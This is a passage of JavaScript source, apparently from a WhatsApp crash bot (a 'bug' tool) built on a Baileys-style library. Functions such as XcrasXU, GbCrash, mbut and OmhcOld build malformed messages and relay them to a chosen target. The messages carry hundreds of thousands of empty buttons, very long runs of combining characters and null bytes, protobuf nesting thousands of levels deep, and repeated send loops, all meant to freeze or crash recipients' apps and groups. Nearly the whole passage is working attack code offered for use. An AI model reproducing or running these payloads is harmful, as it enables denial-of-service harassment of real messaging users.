      fileLength: 9999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "allstart¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
  },
   body: {
   text: "YakuzaXsilence"
},
 nativeFlowMessage: {
 buttons: Array.from({ length: 500000 }, () => ({}))
}
}
}
}
};

const yandex = generateWAMessageFromContent(target, AXcrb, {});

await sock.relayMessage(target, yandex.message, {
participant: true,
  messageId: yandex.key.id
})

const CrBLLC = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        groupStatusMessageV2: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 4,
                            tableMetadata: {
                                title: "YakuzaXsilence",
                                rows: Array.from({ length: 299999 }, () => ({}))
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "CRB"
                        },
                        forwardOrigin: 4
                    }
                }
            }
        }
    };

    const CrBLXC = generateWAMessageFromContent(target, CrBLLC, {});

    await sock.relayMessage(target, CrBLXC.message, {
    participant: true,
    messageId: CrBLXC.key.id
    });
}


async function FrezeIMgX(sock, target) {
  const CrBYA = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
         header: {
        imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 9999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "allstart¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
  },
   body: {
   text: "YakuzaXsilence"
},
 nativeFlowMessage: {
 buttons: Array.from({ length: 500000 }, () => ({}))
}
}
}
}
};

const CrBYZ = generateWAMessageFromContent(target, CrBYA, {});

await sock.relayMessage(target, CrBYZ.message, {
participant: true,
  messageId: CrBYZ.key.id
})

const CrBZZ = {
groupStatusMessageV2: { 
message: {
interactiveMessage: {
body: {
text: "YakuzaXsilence"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
},
},
},
};

const CrBZI = generateWAMessageFromContent(target, CrBZZ, {});

await sock.relayMessage(target, CrBZI.message, {
participant: true,
messageId: CrBZI.key.id
})
}

async function BumXL(sock, target) {
const CrBZA = {
groupStatusMessageV2: { 
message: {
interactiveMessage: {
body: {
text: "YakuzaXsilence"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
contextInfo: {
quotedMessage: {
albumMessage: {
expectedImageCount: 9999,
expectedVideoCount: 9999
},
},
},
},
},
},
};

const CrbA = generateWAMessageFromContent(target, CrBZA, {});

await sock.relayMessage(target, CrbA.message, {
participant: true,
messageId: CrbA.key.id
})
}

async function XcrasXU(sock, target) {
const crashXG = {
groupStatusMessageV2: {
message: {
interactiveMessage: {
header: {
title: "YakuzaXsilence",
hasMediaAttachment: true,
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
mimetype: "application/pdf",
fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
fileLength: 999999999,
pageCount: 1000,
mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
fileName: "allstart.PDF",
fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
mediaKeyTimestamp: "1779839963",
thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
jpegThumbnail: null,
contextInfo: {},
thumbnailHeight: 999,
thumbnailWidth: 999
}
},
body: {
text: " ",
},
nativeFlowMessage: {
 buttons: Array.from({ length: 500000 }, () => ({}))
}
}
}
}
};

const crashXH = generateWAMessageFromContent(target, crashXG, {});

await sock.relayMessage(target, crashXH.message, {
participant: true,
messageId: crashXH.key.id
})
}

async function ContacXA(sock, target) {
const crashXI = {
groupStatusMessageV2: { 
message: {
interactiveMessage: {
body: {
text: "YakuzaXsilence"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
contextInfo: {
quotedMessage: {
contactMessage: {
displayName: " ",
vcard: null
},
},
},
},
},
},
};

const crashXJ = generateWAMessageFromContent(target, crashXI, {});

await sock.relayMessage(target, crashXJ.message, {
participant: true,
messageId: crashXJ.key.id
})
}

//function Blank Screen 
async function XcrashXXZ(sock, target) {
await sock.relayMessage(target,{
interactiveMessage: {
header: {
title: "YakuzaXsilence" + "ꦾ࣯".repeat(10000),
hasMediaAttachment: true,
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
mimetype: "application/pdf",
fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
fileLength: 999999999,
pageCount: 1000,
mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
fileName: "MakLo.pdf",
fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
mediaKeyTimestamp: "1779839963",
thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
jpegThumbnail: null,
contextInfo: {},
thumbnailHeight: 999,
thumbnailWidth: 999
}
},
body: {
text: "YakuzaXsilence" + "ꦾ࣯".repeat(55000),
},
contextInfo: {
stanzaId: "CRB" + Date.now(),
forwardingScore: 1,
isForwarded: true,
mentionedJid: [target],
},
nativeFlowMessage: {
buttons: [
{
name: "catalog_message",
buttonParamsJson: "{}",
}
],
}
}
}, {
additionalNodes: [
{
tag: "biz",
attrs: { native_flow_name: "catalog_message" }
}
],
participant: true
});
}

async function LockGb(sock, groupJid) {
    await sock.groupParticipantsUpdate(groupJid, ["13135550002@s.whatsapp.net"], "add");
}

async function GbCrash(sock, target) {
  try {
    const MgbMsg = {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            contentText: "YakuzaXsilence-" + "?".repeat(50000),
            footerText: "_/ASSALAMUALLAIKUM?" ,
            headerType: 1,
            buttons: [
              {
                buttonId: "helloAllmember",
                buttonText: {
                  displayText: "?".repeat(90000)
                },
                type: 1
              }
            ],
            contextInfo: {
              mentionedJid: Array.from({ length: 1900 }, () => 
                `1${Math.floor(Math.random() * 999999999999)}@s.whatsapp.net`
              ),
              participant: target,
              remoteJid: target,
              forwardingScore: 999999999,
              isForwarded: true,
              quotedMessage: {
                locationMessage: {
                  degreesLatitude: 99999999999999999999,
                  degreesLongitude: 99999999999999999999,
                  name: "OmhcSilence!-",
                  address: "\u0000",
                  url: "\u0000",
                  jpegThumbnail: null
                }
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, MgbMsg, {
      userJid: target
    });

    console.log("Berhasil");
  } catch (err) {
    console.log(err);
  }
}

async function ange(sock, target) {
    const IMG = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 20010,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 1600,
        width: 1200,
        jpegThumbnail: ""
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const Payload = proto.Message.encode(
        proto.Message.fromObject({ imageMessage: IMG })
    ).finish();

    const inflate = function(tag, depth) {
        var buf = Payload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });


    var MAX_BATCH = 1;
    var DELAY_MS  = 1000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var bokep   = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx   = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('n' + idx) : 'n';
        var msg  = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag     = TAGS[ti];
            var ampasx = null;

            for (var depth = 5000; depth >= 2000 && !ampasx; depth -= 400) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    ampasx = decoded;
                } catch (_) {}
            }

            if (!ampasx) continue;

            await sock.relayMessage('status@broadcast', ampasx, {
                messageId: msg,
                statusJidList: bokep,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: bokep.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });
        }
    }
}

async function mbut(sock, target) {
  const vell = {
    interactiveMessage: {
      header: {
        imageMessage: {
          url: 'https://mmg.whatsapp.net/v/t62.7118-24/549782050_1667322724497317_8528276787284026732_n.enc?ccb=11-4&oh=01_Q5Aa4wEyDjv4sxnAUFYX-3cWJzXSE05ytxprVD3cwRsLy4tw8w&oe=6A698817&_nc_sid=5e03e0&mms3=true',
          mimetype: 'image/jpeg',
          fileSha256: 'KQCDQf+kDfdHMXnIXXnKG2IheQmK/6H9dS4IHG/y9RI=',
          fileLength: '60162',
          height: 1599,
          width: 899,
          mediaKey: 'AEQGryabahhd/aG9eHQWd8L6c0nBxE+bXKyjRetugSc=',
          fileEncSha256: 'fETi5PetRz4g98IPNZJNsN/bnHShvMABktQbYVNKkss=',
          directPath: '/v/t62.7118-24/549782050_1667322724497317_8528276787284026732_n.enc?ccb=11-4&oh=01_Q5Aa4wEyDjv4sxnAUFYX-3cWJzXSE05ytxprVD3cwRsLy4tw8w&oe=6A698817&_nc_sid=5e03e0',
          mediaKeyTimestamp: '1782718185',
          jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAEAAUDAgEBAAMBAAAAAAAAAAAAAAAAAAECAwD/2gAMAwEAAhADEAAAAHdOXWdvRkZRyLnMD6ue4BB/RQ3ewZhpaGPrZe3wK85bpPNkQUqPMZufpe50ziU8kuqNl1Y//8QAIhAAAgICAgICAwAAAAAAAAAAAQIAAxEhEjEEIjJBFCNR/9oACAEBAAE/AFtB6EzmZ1HCjbGIUZ/WKE+oI+peLHsH8lScLJ4zvskypuQBj7WBRGAx2IF6lli1isZxLCxT1nlB/wAcAdxKfIc5LsBEcONdgwIHCkiEhZhbNS/NX1FWyq7IUkTmyoMKYrW2ueYIEyFGjLP2KRBiM6qNxr64biehKVwMmP5CL9yy/mdmVgWNgRaUX5NACfiIwrs7GDLaOOw08McFJMpXm2THcIvrP//EABoRAQEAAwEBAAAAAAAAAAAAAAEAAhARISD/2gAIAQIBAT8A0SQduT6WPj8GRJv/xAAcEQADAAIDAQAAAAAAAAAAAAAAAREQIQISMWH/2gAIAQMBAT8AGQXIsO/wWmPayoNO4XhD/9k=',
        },
        hasMediaAttachment: true,
      },
      body: { text: 'YakuzaXsilence' },
      nativeFlowMessage: {
        buttons: [
          {
            name: 'review_and_pay',
            buttonParamsJson: JSON.stringify({
              currency: 'IDR',
              payment_configuration: '0',
              payment_type: 'upr',
              transaction_id: null,
              total_amount: {
                value: 1000000,
                offset: 100,
              },
              reference_id: 'ြ'.repeat(15000),
              type: 'physical-goods',
              payment_method: '',
              order: {
                status: 'pending',
                description: '',
                order_type: 'PAYMENT_REQUEST',
                items: [],
              },
              payment_settings: [
                {
                  type: 'payment_account',
                  payment_account: {
                    account_type: 'bank_account',
                    identifier_type: 'id_account_number',
                    identifier_value: '1',
                    institution_name: 'Dana',
                    beneficiary_name: '4vell' + 'ြ'.repeat(15000),
                  },
                },
              ],
              additional_note: '4vell',
              share_payment_status: true,
              is_soft_deleted: true,
            }),
          },
          ...Array.from({ length: 2000 }, () => ({
            name: 'single_select',
            buttonParamsJson: '0',
          })),
        ],
      },
    },
  }

  const vell2 = {
    interactiveMessage: {
      header: {
        title: '⎋ 🦠𞋯友 | YakuzaXsilence🍷𞋯 -‣' + 'ြ'.repeat(7500) + '꧀'.repeat(60000),
        documentMessage: {
          url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
          mimetype: 'raldz/pler/application/vnd.openxmlformats-officedocument.presentationml.presentation/video/mp4/image/jpeg/webp/audio/mpeg',
          fileSha256: 'QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=',
          fileLength: '1073741824000000',
          pageCount: 9007199254740991 * 9999,
          mediaKey: 'EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=',
          fileName: '⎋ 🦠𞋯友 | YakuzaXsilence🍷𞋯 -‣' + 'ြ'.repeat(15000),
          fileEncSha256: 'oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=',
          directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
          mediaKeyTimestamp: '1723855952',
          contactVcard: true,
          thumbnailDirectPath: '/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0',
          thumbnailSha256: 'njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=',
          thumbnailEncSha256: 'gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=',
          jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z',
        },
        hasMediaAttachment: true,
      },
      body: {
        text: '꧀'.repeat(60000),
      },
      contextInfo: {
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: -99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999e999999999999999999999999999999999999999999999999999999999999999 * 99999999999999999999999999999999999999999999999999999999999999999999,
          },
        },
      },
      nativeFlowMessage: {
        buttons: 'ြ'.repeat(15000),
      },
    },
  }

  const vell3 = {
    interactiveMessage: {
      header: {
        title: 'BellionSpace?',
        imageMessage: {
          url: 'https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg?ccb=9-4&oh=01_Q5Aa4wEJA1yWx93n2LsHl57Q5gRboTzP0JFzapGd127AkxlN7Q&oe=6A6873B3&_nc_sid=e6ed6c&mms3=true',
          mimetype: 'image/jpeg',
          caption: 'ZzzzzZ',
          fileSha256: 'c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=',
          fileLength: '634893',
          height: 1022,
          width: 1080,
          mediaKey: 'G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=',
          fileEncSha256: 'PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=',
          directPath: '/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg?ccb=9-4&oh=01_Q5Aa4wEJA1yWx93n2LsHl57Q5gRboTzP0JFzapGd127AkxlN7Q&oe=6A6873B3&_nc_sid=e6ed6c',
          mediaKeyTimestamp: '1782643133',
          jpegThumbnail: '/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhDY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQAERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z',
          hasMediaAttachment: true,
        },
      },
      body: { text: '友 | YakuzaXsilence Back?' + 'ꦾ'.repeat(60000) },
      footer: { text: '\x00'.repeat(50) },
      nativeFlowMessage: {
        buttons: [
          {
            name: 'order_status',
            buttonParamsJson: JSON.stringify({
              reference_id: 'PL-' + Date.now(),
              order: {
                status: 'PROCESSING',
                currency: 'IDR',
                subtotal: { value: 10000, offset: 100 },
                tax: { value: 0, offset: 100 },
                shipping: { value: 0, offset: 100 },
                discount: { value: 0, offset: 100 },
                total: { value: 10000, offset: 100 },
                items: [
                  {
                    name: '\x00'.repeat(100000),
                    quantity: 1,
                    amount: { value: 10000, offset: 100 },
                    sale_amount: { value: 10000, offset: 100 },
                  },
                ],
              },
            }),
          },
        ],
        messageParamsJson: '{'.repeat(10000),
      },
      contextInfo: {
        remotejid: 'pL',
        forwardingScore: 1,
        isForwarded: true,
        forwardedAiBotMessageInfo: { botJid: '867051314767696@bot' },
        forwardOrigin: 4,
        alwaysShowAdAttribution: true,
      },
    },
  }

  const vell4 = {
    interactiveMessage: {
      body: {
        text: '友|Omhc?',
      },
      contextInfo: {
        quotedMessage: {
          stickerMessage: {},
        },
      },
      nativeFlowMessage: {
        buttons: 'ြ'.repeat(150000),
      },
    },
  };
  
  await sock.relayMessage(target, vell4, {})
  await sock.relayMessage(target, vell3, {})
  await sock.relayMessage(target, vell2, {})
  await sock.relayMessage(target, vell, {})
}

async function OmhcOld(sock, target) {
  try {
    console.log(`Processing: ${target}`);

    const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    
    await sock.relayMessage(target, {
      interactiveMessage: {
        body: { text: "\u0000".repeat(999999) },
        nativeFlowMessage: {
          buttons: [
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({ 
                display_text: "\u0000".repeat(100000), 
                id: null 
              })
            }
          ]
        }
      }
    }, { participant: { jid: target } });

    await wait(300);

    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: Buffer.alloc(200000, 0xff)
          },
          interactiveResponseMessage: {
            body: { text: "\u0000".repeat(500000), format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            }
          }
        }
      }
    }, { participant: { jid: target } });

    await wait(200);

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          protocolMessage: {
            type: 25,
            key: { remoteJid: "status@broadcast", fromMe: true, id: "force_invisible" }
          }
        }
      }
    }, { participant: { jid: target } });

    await wait(100);

    for (let i = 0; i < 200; i++) {
      var cards = [];

      for (let v = 0; v < 3; v++) {
        cards.push({
          body: {
            text: "\n".repeat(10) + "ꦾ".repeat(5000)
          },
          footer: {
            text: "\n".repeat(10)
          },
          header: {
            title: "memeg",
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc",
              mimetype: "image/jpeg",
              fileSha256: Buffer.from("QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=", "base64"),
              fileLength: "999999999999999",
              height: 1,
              width: -1,
              mediaKey: Buffer.from("exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=", "base64"),
              fileEncSha256: Buffer.from("D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=", "base64"),
              directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc",
              mediaKeyTimestamp: 1755254367,
              jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
              imageSourceType: null
            }
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  display_text: "ោ៝".repeat(5000),
                  id: null
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦾ".repeat(10000),
                  id: null
                })
              },
              {
                name: "review_and_pay",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦾ".repeat(10000)
                })
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  flow_action: "navigate",
                  flow_action_payload: { screen: "WELCOME_SCREEN" },
                  flow_cta: "ꦾ".repeat(10000),
                  flow_id: "perfect...",
                  flow_message_version: "9",
                  flow_token: "Family!"
                })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦾ".repeat(10000),
                  copy_code: "ꦾ".repeat(10000)
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦾ".repeat(10000),
                  url: "https://t.me/kiuchan11"
                })
              },
              {
                name: "request_location",
                buttonParamsJson: JSON.stringify({
                  type: "request_location",
                  display_text: "ꦾ".repeat(10000),
                  params: {}
                })
              },
              {
                name: "send_location",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦾ".repeat(10000)
                })
              }
            ],
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999
            }
          }
        });
      }

      const cv = {
        key: { remoteJid: target, fromMe: true, id: Math.random().toString(36).substring(2, 15) },
        message: {
          interactiveMessage: {
            header: { hasMediaAttachment: false },
            body: { text: "ꦾ".repeat(26000) },
            footer: { text: "ꦾ".repeat(5000) },
            carouselMessage: { cards: cards },
            contextInfo: {
              stanzaId: null,
              quotedMessage: {
                conversation: "ꦾ".repeat(15000)
              },
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net"]
            }
          }
        },
        messageTimestamp: Math.floor(Date.now() / 1000)
      };

      await sock.relayMessage(target, cv.message, {
        messageId: null,
        participant: { jid: target }
      });

      await wait(10);

      await sock.relayMessage(target, cv.message, {
        messageId: null,
        participant: { jid: target }
      });

      await wait(750);
    }

    await sock.relayMessage(target, {
      "videoMessage": {
        "url": "https://mmg.whatsapp.net/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&mms3=true",
        "mimetype": "video/mp4",
